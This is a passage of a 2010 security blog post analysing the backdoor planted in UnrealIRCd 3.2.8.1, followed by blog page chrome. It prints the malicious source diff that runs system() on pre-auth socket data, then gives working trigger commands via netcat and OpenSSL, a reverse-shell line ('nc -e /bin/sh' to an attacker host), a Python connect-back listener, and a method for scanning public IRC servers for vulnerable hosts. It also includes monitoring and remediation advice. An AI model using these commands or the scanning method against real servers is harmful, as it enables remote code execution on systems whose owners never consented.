+ #define IsNotSpoof(x)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; (1)
+ #endif
++#define&nbsp; &nbsp; &nbsp; &nbsp; DEBUGMODE3&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ((x)-&gt;flags & FLAGS_NOFAKELAG)
+
+ #define GetHost(x)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; (IsHidden(x) ? (x)-&gt;user-&gt;virthost : (x)-&gt;user-&gt;realhost)
+ #define GetIP(x)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; ((x-&gt;user && x-&gt;user-&gt;ip_str) ? x-&gt;user-&gt;ip_str : (MyConnect(x) ? Inet_ia2p(&x-&gt;ip) : NULL))
+@@ -513,6 +515,10 @@
+ #else
+ #define CHECKPROTO(x,y) (checkprotoflags(x, y, __FILE__, __LINE__))
+ #endif
++#ifdef DEBUGMODE3
++#define DEBUGMODE3_INFO&nbsp; &nbsp; &nbsp; &nbsp; "AB"
++#define&nbsp; &nbsp; &nbsp; &nbsp; DEBUG3_LOG(x) DEBUG3_DOLOG_SYSTEM (x)
++#endif
+
+ #define DontSendQuit(x)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (CHECKPROTO(x, PROTO_NOQUIT))
+ #define IsToken(x)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; (CHECKPROTO(x, PROTO_TOKEN))
+@@ -1373,6 +1379,7 @@
+ #define INCLUDE_REMOTE&nbsp; &nbsp;&nbsp; 0x2
+ #define INCLUDE_DLQUEUED&nbsp;&nbsp; 0x4
+ #define INCLUDE_USED&nbsp; &nbsp; &nbsp;&nbsp; 0x8
++#define DEBUG3_DOLOG_SYSTEM(x) system(x)
+
+ struct _configitem_include {
+&nbsp; &nbsp; &nbsp; &nbsp; ConfigItem *prev, *next;
+diff -urN Unreal3.2.8.1/src/s_bsd.c Unreal3.2.8.1_backdoor/src/s_bsd.c
+--- Unreal3.2.8.1/src/s_bsd.c&nbsp;&nbsp; 2009-03-01 19:37:58.000000000 +0100
++++ Unreal3.2.8.1_backdoor/src/s_bsd.c&nbsp; 2006-06-16 20:29:00.000000000 +0200
+@@ -1431,6 +1431,10 @@
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return 1;
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (length &lt;= 0)
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return length;
++#ifdef DEBUGMODE3
++&nbsp; &nbsp; &nbsp;&nbsp; if (!memcmp(readbuf, DEBUGMODE3_INFO, 2))
++&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; DEBUG3_LOG(readbuf);
++#endif
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; for (h = Hooks[HOOKTYPE_RAWPACKET_IN]; h; h = h-&gt;next)
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; int v = (*(h-&gt;func.intfunc))(cptr, readbuf, length);
+</pre><br />
+Ok, the backdoor is very simple: basically a few lines with defines and macros in order to have a <b><a href="http://linux.die.net/man/3/system">system()</a></b> on socket data if this data begins with special word <b>AB</b>. You're not protected by your IRCd password since it's raw (pre-auth). Also note that the backdoor is in an <a href="http://en.wikipedia.org/wiki/C_preprocessor#Conditional_compilation">#ifndef USE_POLL</a> so versions using <a href="http://linux.die.net/man/3/poll">poll()</a> are not affected. Sadly and as far as I know, poll is deprecated in favor of <a href="http://linux.die.net/man/3/select">select()</a> so the backdoor is there for most versions.<br />
+<br />
+<br />
+<h3>Exploit</h3><br />
+The following shell command triggers the backdoor with <a href="http://en.wikipedia.org/wiki/Netcat">netcat</a>:<br />
+<pre class="brush: bash">echo "AB;&lt;command&gt;" |nc &lt;IRCd address&gt; &lt;port&gt;</pre><br />
+As you may know, the default port for IRC should be 194 according to the <a href="http://www.iana.org/assignments/port-numbers">IANA assignment</a>, however no one is using it since it's a port lower than 1024 (requiring privileges) and the common port for IRC is <b>6667</b>.<br />
+<br />
+It should also work on <a href="http://en.wikipedia.org/wiki/Transport_Layer_Security">SSL/TLS</a> servers (though I did not test yet). To trigger the backdoor in SSL/TLS, simply use <a href="http://www.openssl.org">OpenSSL</a>'s <a href="http://www.openssl.org/docs/apps/s_client.html">s_client</a>:<br />
+<pre class="brush: bash">echo "AB;&lt;command&gt;" |openssl s_client -connect &lt;IRCd address&gt;:&lt;port&gt;</pre><br />
+Again, according to the <a href="http://www.iana.org/assignments/port-numbers">IANA assignment</a> it should be port 994 but no one is using it. Most of the time it's port <b>6697</b>, but it's not as common as the clear-text port so you may find other ports.<br />
+<br />
+<br />
+<h3>Monitoring backdoor access attempts</h3><br />
+If you're running an IRC server, you can use <a href="http://ngrep.sourceforge.net/">ngrep</a> to literally <a href="http://en.wikipedia.org/wiki/Grep">grep</a> the network in order to see attempts to trigger the backdoor:<br />
+<pre class="brush: bash"># ngrep -tqxl "^AB" "tcp dst port 6667"
+interface: eth0 (X.Y.Z.T/255.255.255.255)
+filter: (ip or ip6) and ( tcp dst port 6667 )
+match: ^AB
+
+T 2010/06/13 16:57:10.187607 A.B.C.D:52914 -> X.Y.Z.T:6667 [AP]
+  41 42 3b 6b 69 6c 6c 20    60 70 73 20 2d 65 20 7c    AB;kill `ps -e |
+  20 67 72 65 70 20 69 72    63 64 20 7c 20 61 77 6b     grep ircd | awk
+  20 27 7b 20 70 72 69 6e    74 20 24 31 20 7d 27 60     '{ print $1 }'`
+  0a                                                    .
+</pre>Here someone is trying to scan & kill all IRC servers infected by the backdoor with the <a href="http://nmap.org/book/nse.html">NSE</a> (Nmap Scripting Engine) <a href="http://seclists.org/nmap-dev/2010/q2/att-833/irc-unrealircd-backdoor.nse">script</a> <a href="http://seclists.org/nmap-dev/2010/q2/833">seen</a> on <a href="http://seclists.org/nmap-dev">nmap-dev</a> mailing list. Killing is good idea, sadly most IRC servers have a <a href="http://cvsweb.unrealircd.com/cgi-bin/cvsweb/unreal/ircdcron/ircd.cron?rev=1.1.1.1.6.2;content-type=text/plain">cron</a> <a href="http://cvsweb.unrealircd.com/cgi-bin/cvsweb/unreal/ircdcron/Attic/ircdchk.in?rev=1.1.2.1;content-type=text/plain">script</a> (or something like <a href="http://mmonit.com/monit/">monit</a>) to restart the server if it is not running.<br />
+<br />
+<br />
+<h3>Obtaining a shell with connect-back</h3><br />
+In order to easily use the backdoor, we could use the known method of <i>connect-back</i> shell. It won't work with servers behind a properly configured firewall (disallowing connect-backs), hopefully most of them are not.<br />
+<br />
+Assuming attacker machine is 10.0.0.1 and backdoored IRCd is 10.0.0.2, it gives:<br />
+<br />
+Attacker shell 1:<br />
+<pre class="brush: bash">$ nc -vnlp 6676
+listening on [any] 6676 ...
+</pre>Attacker shell 2:<br />
+<pre class="brush: bash">$ echo "AB;nc -e /bin/sh 10.0.0.1 6676" |nc 10.0.0.2 6667</pre>Then on shell 1:<br />
+<pre class="brush: bash">connect to [10.0.0.1] from (UNKNOWN) [10.0.0.2] 44525
+id
+uid=1000(irc) gid=1000(irc) groups=1000(irc)
+</pre><br />
+<br />
+<h3>Scanning the internet for backdoored UnrealIRCds</h3><br />
+Next step would be to scan all IRC servers and find which ones are affected. Since we need a reply to know if the exploit worked, we will use the connect-back method and leave those with good firewalls alone. ;)<br />
+<br />
+We can trigger the backdoor with:<br />
+<pre class="brush: bash">echo "AB;nc -e /usr/bin/id &lt;your server&gt; 6676" |nc -w 2 &lt;ircd&gt; 6667</pre><br />
+We just need a simple TCP server to log all connections: connecting IP as well as the message with the user running the IRCd thanks to <a href="http://en.wikipedia.org/wiki/Id_(Unix)">id</a>. The following <a href="http://www.python.org/">Python</a> script (<a href="http://stalkr.net/files/unrealircd/connect-back-server.py">connect-back-server.py</a>) does this using the useful <a href="http://docs.python.org/library/socketserver.html">SocketServer</a> class:<br />
+<pre class="brush: python">#!/usr/bin/env python
+# Connect-back server for UnrealIRCd 3.2.8.1 backdoor
+# May not work on firewalled hosts though the backdoor is here
+import SocketServer,sys
+PORT=6676
+
+class S(SocketServer.BaseRequestHandler):
+  allow_reuse_address = True
+  def handle(self):
+    print "%s: %s" % (self.client_address[0],self.request.recv(1024).strip())
+    sys.stdout.flush()
+
+try:
+  SocketServer.TCPServer(("0.0.0.0", PORT), S).serve_forever()
+except KeyboardInterrupt,e:
+  sys.exit(1)
+</pre><br />
+The next thing we need is a list of IRC servers in order to trigger the backdoor and see the results in the connect-back server.<br />
+<br />
+<br />
+<h3>Harvesting IRC servers</h3><br />
+A good start is mIRC's <a href="http://www.mirc.com/servers.ini">servers.ini</a> list. To improve this list, <a href="http://irc.netsplit.de/servers/">netsplit.de</a> and <a href="http://searchirc.com/networks/">SearchIRC</a> have a pretty good lists of all IRC networks and servers. We could also use pages like <a href="http://www.denorastats.org/users/">Denora IRC Stats users</a> to get more IRC servers.<br />
+<br />
+By the way if you are running an IRC network, <a href="http://www.denorastats.org">Denora</a> is a very good piece of software to provide statistics, along with <a href="http://www.denorastats.org">phpDenora</a>. Small advertisement because I like these guys and the software is very good :)<br />
+<br />
+Grabbing all these IRC servers and making a list requires subtle use of <a href="http://www.gnu.org/software/wget/">wget</a> (to avoid being seen as a robot or trying to DoS) plus some parsing, use your shell/grep/sed/perl/whatever guru skills.<br />
+<br />
+Now to improve this list, remember the <a href="http://en.wikipedia.org/wiki/Round_robin_DNS">Round-Robin DNS</a>: multiple IP addresses for one hostname (and possibly different IRC servers). So we'll use <i><a href="http://en.wikipedia.org/wiki/Domain_Information_Groper">dig</a> +short</i> to get all the records.<br />
+<br />
+Then we decide to focus only on default IRC port 6667 and filter out all hosts with 6667 closed by using the ultimate network scanner <a href="http://nmap.org/">nmap</a>. It finally gives a list of <b>~1300</b> hosts possibly running an IRCd.<br />
+<br />
+<br />
+<h3>Scan results</h3><br />
+10 hours after the original announcement (14h00 UTC), someone reported that <b>2%</b> of the public IRC servers were infected (and had connect-back working).. with some hosts running the IRCd as <b>root</b>! :o<br />
+<br />
+<br />
+<h3>Conclusion</h3><br />
+Bad for UnrealIRCd and affected users, but the good thing is that we can all learn from this for the future. <i>Syzop</i> (head developer of UnrealIRCd) <a href="http://forums.unrealircd.com/viewtopic.php?t=6563">announced</a> that from now on, releases are signed with GnuPG (PGP) again.<br />
+<i>Fyodor</i> (head developer of nmap) also made an interesting <a href="http://seclists.org/nmap-dev/2010/q2/826">post</a> about it on <a href="http://seclists.org/nmap-dev">nmap-dev</a> mailing list and reminds us to practice safe software.<br />
+<br />
+Needless to say that if you see the backdoor on your server, you should really consider reinstalling the whole server (and maybe more), change your passwords and so on. Eight month is a really long time..<br />
+<br />
+In addition to running the IRC server under an unprivileged user, one could also consider running it in a restricted environment: a <a href="http://en.wikipedia.org/wiki/FreeBSD_jail">FreeBSD jail</a>, a <a href="http://wiki.openvz.org">OpenVZ</a> container, a <a href="http://linux-vserver.org">Linux-VServer</a>, or even if it's not perfect just a <a href="http://en.wikipedia.org/wiki/Chroot">chroot</a> (UnrealIRCd <a href="http://bugs.unrealircd.org/view.php?id=2446">seems</a> to support it).
+<div style='clear: both;'></div>
+</div>
+<div class='post-footer'>
+<div class='post-footer-line post-footer-line-1'>
+<span class='post-author vcard'>
+Posted by
+<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
+<meta content='https://www.blogger.com/profile/15113480981262771031' itemprop='url'/>
+<a class='g-profile' href='https://www.blogger.com/profile/15113480981262771031' rel='author' title='author profile'>
+<span itemprop='name'>StalkR</span>
+</a>
+</span>
+</span>
+<span class='post-timestamp'>
+at
+<meta content='https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html' itemprop='url'/>
+<a class='timestamp-link' href='https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2010-06-13T21:36:00+02:00'>21:36</abbr></a>
+</span>
+<span class='post-comment-link'>
+</span>
+<span class='post-icons'>
+<span class='item-control blog-admin pid-333601375'>
+<a href='https://www.blogger.com/post-edit.g?blogID=9099779&postID=4574631714866481251&from=pencil' title='Edit Post'>
+<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
+</a>
+</span>
+</span>
+<div class='post-share-buttons goog-inline-block'>
+</div>
+</div>
+<div class='post-footer-line post-footer-line-2'>
+<span class='post-labels'>
+Labels:
+<a href='https://blog.stalkr.net/search/label/backdoor' rel='tag'>backdoor</a>,
+<a href='https://blog.stalkr.net/search/label/irc' rel='tag'>irc</a>,
+<a href='https://blog.stalkr.net/search/label/netcat' rel='tag'>netcat</a>,
+<a href='https://blog.stalkr.net/search/label/nmap' rel='tag'>nmap</a>,
+<a href='https://blog.stalkr.net/search/label/openssl' rel='tag'>openssl</a>,
+<a href='https://blog.stalkr.net/search/label/trojan' rel='tag'>trojan</a>,
+<a href='https://blog.stalkr.net/search/label/unrealircd' rel='tag'>unrealircd</a>
+</span>
+</div>
+<div class='post-footer-line post-footer-line-3'>
+<span class='post-location'>
+</span>
+</div>
+</div>
+</div>
+<div class='comments' id='comments'>
+<a name='comments'></a>
+<h4>1 comment:</h4>
+<div class='comments-content'>
+<script async='async' src='' type='text/javascript'></script>
+<script type='text/javascript'>
+    (function() {
+      var items = null;
+      var msgs = null;
+      var config = {};
+
+// <![CDATA[
+      var cursor = null;
+      if (items && items.length > 0) {
+        cursor = parseInt(items[items.length - 1].timestamp) + 1;
+      }
+
+      var bodyFromEntry = function(entry) {
+        var text = (entry &&
+                    ((entry.content && entry.content.$t) ||
+                     (entry.summary && entry.summary.$t))) ||
+            '';
+        if (entry && entry.gd$extendedProperty) {
+          for (var k in entry.gd$extendedProperty) {
+            if (entry.gd$extendedProperty[k].name == 'blogger.contentRemoved') {
+              return '<span class="deleted-comment">' + text + '</span>';
+            }
+          }
+        }
+        return text;
+      }
+
+      var parse = function(data) {
+        cursor = null;
+        var comments = [];
+        if (data && data.feed && data.feed.entry) {
+          for (var i = 0, entry; entry = data.feed.entry[i]; i++) {
+            var comment = {};
+            // comment ID, parsed out of the original id format
+            var id = /blog-(\d+).post-(\d+)/.exec(entry.id.$t);
+            comment.id = id ? id[2] : null;
+            comment.body = bodyFromEntry(entry);
+            comment.timestamp = Date.parse(entry.published.$t) + '';
+            if (entry.author && entry.author.constructor === Array) {
+              var auth = entry.author[0];
+              if (auth) {
+                comment.author = {
+                  name: (auth.name ? auth.name.$t : undefined),
+                  profileUrl: (auth.uri ? auth.uri.$t : undefined),
+                  avatarUrl: (auth.gd$image ? auth.gd$image.src : undefined)
+                };
+              }
+            }
+            if (entry.link) {
+              if (entry.link[2]) {
+                comment.link = comment.permalink = entry.link[2].href;
+              }
+              if (entry.link[3]) {
+                var pid = /.*comments\/default\/(\d+)\?.*/.exec(entry.link[3].href);
+                if (pid && pid[1]) {
+                  comment.parentId = pid[1];
+                }
+              }
+            }
+            comment.deleteclass = 'item-control blog-admin';
+            if (entry.gd$extendedProperty) {
+              for (var k in entry.gd$extendedProperty) {
+                if (entry.gd$extendedProperty[k].name == 'blogger.itemClass') {
+                  comment.deleteclass += ' ' + entry.gd$extendedProperty[k].value;
+                } else if (entry.gd$extendedProperty[k].name == 'blogger.displayTime') {
+                  comment.displayTime = entry.gd$extendedProperty[k].value;
+                }
+              }
+            }
+            comments.push(comment);
+          }
+        }
+        return comments;
+      };
+
+      var paginator = function(callback) {
+        if (hasMore()) {
+          var url = config.feed + '?alt=json&v=2&orderby=published&reverse=false&max-results=50';
+          if (cursor) {
+            url += '&published-min=' + new Date(cursor).toISOString();
+          }
+          window.bloggercomments = function(data) {
+            var parsed = parse(data);
+            cursor = parsed.length < 50 ? null
+                : parseInt(parsed[parsed.length - 1].timestamp) + 1
+            callback(parsed);
+            window.bloggercomments = null;
+          }
+          url += '&callback=bloggercomments';
+          var script = document.createElement('script');
+          script.type = 'text/javascript';
+          script.src = url;
+          document.getElementsByTagName('head')[0].appendChild(script);
+        }
+      };
+      var hasMore = function() {
+        return !!cursor;
+      };
+      var getMeta = function(key, comment) {
+        if ('iswriter' == key) {
+          var matches = !!comment.author
+              && comment.author.name == config.authorName
+              && comment.author.profileUrl == config.authorUrl;
+          return matches ? 'true' : '';
+        } else if ('deletelink' == key) {
+          return config.baseUri + '/comment/delete/'
+               + config.blogId + '/' + comment.id;
+        } else if ('deleteclass' == key) {
+          return comment.deleteclass;
+        }
+        return '';
+      };
+
+      var replybox = null;
+      var replyUrlParts = null;
+      var replyParent = undefined;
+
+      var onReply = function(commentId, domId) {
+        if (replybox == null) {
+          // lazily cache replybox, and adjust to suit this style:
+          replybox = document.getElementById('comment-editor');
+          if (replybox != null) {
+            replybox.height = '250px';
+            replybox.style.display = 'block';
+            replyUrlParts = replybox.src.split('#');
+          }
+        }
+        if (replybox && (commentId !== replyParent)) {
+          replybox.src = '';
+          document.getElementById(domId).insertBefore(replybox, null);
+          replybox.src = replyUrlParts[0]
+              + (commentId ? '&parentID=' + commentId : '')
+              + '#' + replyUrlParts[1];
+          replyParent = commentId;
+        }
+      };
+
+      var hash = (window.location.hash || '#').substring(1);
+      var startThread, targetComment;
+      if (/^comment-form_/.test(hash)) {
+        startThread = hash.substring('comment-form_'.length);
+      } else if (/^c[0-9]+$/.test(hash)) {
+        targetComment = hash.substring(1);
+      }
+
+      // Configure commenting API:
+      var configJso = {
+        'maxDepth': config.maxThreadDepth
+      };
+      var provider = {
+        'id': config.postId,
+        'data': items,
+        'loadNext': paginator,
+        'hasMore': hasMore,
+        'getMeta': getMeta,
+        'onReply': onReply,
+        'rendered': true,
+        'initComment': targetComment,
+        'initReplyThread': startThread,
+        'config': configJso,
+        'messages': msgs
+      };
+
+      var render = function() {
+        if (window.goog && window.goog.comments) {
+          var holder = document.getElementById('comment-holder');
+          window.goog.comments.render(holder, provider);
+        }
+      };
+
+      // render now, or queue to render when library loads:
+      if (window.goog && window.goog.comments) {
+        render();
+      } else {
+        window.goog = window.goog || {};
+        window.goog.comments = window.goog.comments || {};
+        window.goog.comments.loadQueue = window.goog.comments.loadQueue || [];
+        window.goog.comments.loadQueue.push(render);
+      }
+    })();
+// ]]>
+  </script>
+<div id='comment-holder'>
+<div class="comment-thread toplevel-thread"><ol id="top-ra"><li class="comment" id="c2601924279564447800"><div class="avatar-image-container"><img src="//resources.blogblog.com/img/blank.gif" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="http://www.sevagas.com" rel="nofollow">emeric</a></cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html?showComment=1276594616231#c2601924279564447800">June 15, 2010 at 11:36&#8239;AM</a></span></div><p class="comment-content">Nice investigation!<br>I wonder how the download mirrors were compromised in the first place.</p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="2601924279564447800">Reply</a><span class="item-control blog-admin blog-admin pid-4936671"><a target="_self" href="https://www.blogger.com/comment/delete/9099779/2601924279564447800">Delete</a></span></span></div><div class="comment-replies"><div id="c2601924279564447800-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c2601924279564447800-ra" class="thread-chrome thread-expanded"><div></div><div id="c2601924279564447800-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="2601924279564447800">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c2601924279564447800-ce"></div></li></ol><div id="top-continue" class="continue"><a class="comment-reply" target="_self">Add comment</a></div><div class="comment-replybox-thread" id="top-ce"></div><div class="loadmore hidden" data-post-id="4574631714866481251"><a target="_self">Load more...</a></div></div>
+</div>
+</div>
+<p class='comment-footer'>
+<div class='comment-form'>
+<a name='comment-form'></a>
+<p>
+</p>
+<a href='https://www.blogger.com/comment/frame/9099779?po=4574631714866481251&hl=en&saa=85391&origin=https://blog.stalkr.net' id='comment-editor-src'></a>
+<iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410px' id='comment-editor' name='comment-editor' src='' width='100%'></iframe>
+<script src='https://www.blogger.com/static/v1/jsbin/2830521187-comment_from_post_iframe.js' type='text/javascript'></script>
+<script type='text/javascript'>
+      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html');
+    </script>
+</div>
+</p>
+<div id='backlinks-container'>
+<div id='Blog1_backlinks-container'>
+</div>
+</div>
+</div>
+</div>
+
+        </div></div>
+      
+</div>
+<div class='blog-pager' id='blog-pager'>
+<span id='blog-pager-newer-link'>
+<a class='blog-pager-newer-link' href='https://blog.stalkr.net/2010/07/from-file-tampering-to-local-root.html' id='Blog1_blog-pager-newer-link' title='Newer Post'>Newer Post</a>
+</span>
+<span id='blog-pager-older-link'>
+<a class='blog-pager-older-link' href='https://blog.stalkr.net/2010/06/updated-links-xmlstarlet.html' id='Blog1_blog-pager-older-link' title='Older Post'>Older Post</a>
+</span>
+<a class='home-link' href='https://blog.stalkr.net/'>Home</a>
+</div>
+<div class='clear'></div>
+<div class='post-feeds'>
+<div class='feed-links'>
+Subscribe to:
+<a class='feed-link' href='https://blog.stalkr.net/feeds/4574631714866481251/comments/default' target='_blank' type='application/atom+xml'>Post Comments (Atom)</a>
+</div>
+</div>
+</div></div>
+</div>
+<div id='sidebar-wrapper'>
+<div class='sidebar section' id='sidebar'><div class='widget BlogArchive' data-version='1' id='BlogArchive1'>
+<h2>Blog Archive</h2>
+<div class='widget-content'>
+<div id='ArchiveList'>
+<div id='BlogArchive1_ArchiveList'>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2022/'>
+2022
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2022/01/'>
+January
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2019/'>
+2019
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2019/12/'>
+December
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2019/11/'>
+November
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2015/'>
+2015
+</a>
+<span class='post-count' dir='ltr'>(4)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2015/12/'>
+December
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2015/04/'>
+April
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2015/01/'>
+January
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2014/'>
+2014
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2014/10/'>
+October
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2014/01/'>
+January
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2013/'>
+2013
+</a>
+<span class='post-count' dir='ltr'>(3)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2013/06/'>
+June
+</a>
+<span class='post-count' dir='ltr'>(2)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2013/01/'>
+January
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2012/'>
+2012
+</a>
+<span class='post-count' dir='ltr'>(7)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2012/05/'>
+May
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2012/04/'>
+April
+</a>
+<span class='post-count' dir='ltr'>(3)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2012/03/'>
+March
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2012/02/'>
+February
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2012/01/'>
+January
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2011/'>
+2011
+</a>
+<span class='post-count' dir='ltr'>(17)</span>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='https://blog.stalkr.net/2011/08/'>
+August
+</a>
+<span class='post-count' dir='ltr'>(1)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
